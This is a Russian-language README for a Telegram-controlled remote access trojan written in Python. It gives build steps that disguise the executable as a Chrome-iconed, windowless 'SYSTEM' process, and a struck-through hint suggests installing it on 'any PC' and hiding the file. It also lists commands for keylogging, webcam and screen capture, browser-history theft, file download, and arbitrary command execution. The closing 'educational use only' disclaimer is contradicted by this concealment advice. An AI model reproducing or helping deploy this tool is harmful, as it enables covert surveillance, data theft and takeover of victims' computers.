# Telegram RAT Bot

![Preview](https://github.com/kripersi/RAT-tg-python/blob/main/screenshoots/main.png)

Этот бот позволяет удалённо управлять компьютером через Telegram. Он поддерживает команды для получения информации, выполнения скриптов, управления вводом, скачивания файлов и многого другого.

---------------------------
🔧 Установка
---------------------------

## 1. Установи Python 3.12
Скачай и установи Python с [официального сайта](https://www.python.org/downloads/).  
**Важно:** при установке отметь галочку `Add Python to PATH`.

## 2. Скачай скрипт
Способ 1:
```bash
git clone https://github.com/kripersi/RAT-tg-python.git
cd RAT-tg-python
```
Способ 2:
```bash
curl -O https://github.com/kripersi/RAT-tg-python/archive/refs/heads/main.zip
cd RAT-tg-python
```

## 3. Установи зависимости
```bash
pip install -r requirements.txt
```

## 4. Настрой бота
Открой файл config.py и укажи свои данные:
```bash
   token = 'YOUR_BOT_TOKEN'
   known_ids = ['YOUR_CHAT_ID']
```

## 5. Собери exe файл
```bash
pyinstaller --onefile --noconsole --icon=googlechrome.ico --name=SYSTEM main.py
```   

### 6. Дальше просто устанавливаешь этот exe на ~~любой ПК~~ и запускаешь, желательно exe файл не оставлять на видном месте


---------------------------
📋 Список команд
---------------------------

🤖 Главное меню бота

📌 Основные команды
* /start — Показать список команд  
* /ping — Проверить активность бота  

📷 Работа с изображениями и видео
* /capture_pc — Сделать скриншот экрана  
* /video_pc <секунд> — Записать видео с экрана  
* /capture_webcam — Сделать фото с веб-камеры  
* /wallpaper <путь или URL> — Установить обои на рабочий стол  

🔍 Информация о системе
* /ip_info — Показать IP и геолокацию  
* /pc_info — Показать информацию о системе  
* /ls <путь> — Показать содержимое папки  

💻 Управление системой
* /shutdown — Выключить компьютер  
* /reboot — Перезагрузить компьютер  
* /cmd_exec <команда> — Выполнить команду через CMD  
* /python_exec <код> — Выполнить Python-выражение или скрипт  

🔐 Логи и данные
* /keylogs — Показать логи клавиш  
* /user_log — Показать логи пользователя  
* /chrome_log — Извлечь историю Chrome  
* /edge_log — Извлечь историю Edge  

📥 Работа с файлами
* /download <путь> — Скачать файл  
* /create_more_folders <кол-во> <имя> <текст> — Создать папки с txt-файлами  
* /run <путь> — Запустить файл  

🖱️ Управление мышью
* /move_mouse_coord x y — Переместить курсор в координаты  
* /move_mouse (левее|правее|ниже|выше) x — Смещение курсора на X пикселей  
* /click_mouse — Кликнуть мышью  

📢 Взаимодействие с пользователем
* /msg_box <текст> — Показать сообщение на экране  
* /message_write "текст" — Ввести текст в активное поле  

⚠️ Опасные команды
* /self_destruct — Запрос на удаление бота  

---------------------------
📁 Папки
---------------------------

logs/ — логи клавиш и действий  
scripts/ — загруженные скрипты  
screenshots/ — скриншоты экрана  
webcam/ — фото с вебкамеры

---------------------------
📌 Примеры команд
---------------------------

/cmd_exec dir  
/python_exec print("Привет")  
/move_mouse 500 300  
/msg_box Внимание!  
/ls C:/Users  
/download C:/Users/user/Desktop/test.txt  
/run C:/Program Files/Notepad++/notepad++.exe

---------------------------
⚠️ Важно
---------------------------

- This tool is intended for use only on authorized systems. Use this script for educational purposes only! Any unauthorized use of this tool without explicit permission is illegal.
- Этот инструмент предназначен для использования только на авторизованных системах. Используйте этот скрипт только в образовательных целях! Любое несанкционированное использование этого инструмента без явного разрешения является незаконным.

---------------------------
👨‍💻 Автор
---------------------------

tg: @Marpexiz
https://github.com/kripersi
